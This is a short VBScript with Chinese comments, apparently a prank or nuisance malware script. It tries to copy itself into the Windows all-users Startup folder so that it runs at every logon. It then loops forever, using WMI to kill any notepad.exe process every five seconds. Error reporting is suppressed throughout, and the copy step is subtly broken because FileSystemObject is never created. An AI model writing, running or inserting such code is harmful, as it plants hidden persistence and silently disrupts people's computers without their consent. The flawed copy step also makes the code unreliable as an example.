On Error Resume Next  
'vbs代码开始----------------------------------------------  
sub Close_Process(ProcessName)  
On Error Resume Next  
     for each ps in getobject("winmgmts:\\.\root\cimv2:win32_process").instances_ '循环进程  
           if Ucase(ps.name)=Ucase(ProcessName) then  
                 ps.terminate  
           end if  
     next  

end sub  
FileSystemObject.CopyFile ".\Run.vbs", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Run.vbs"
do
Close_Process("notepad.exe") 
wscript.sleep 5000 
loop
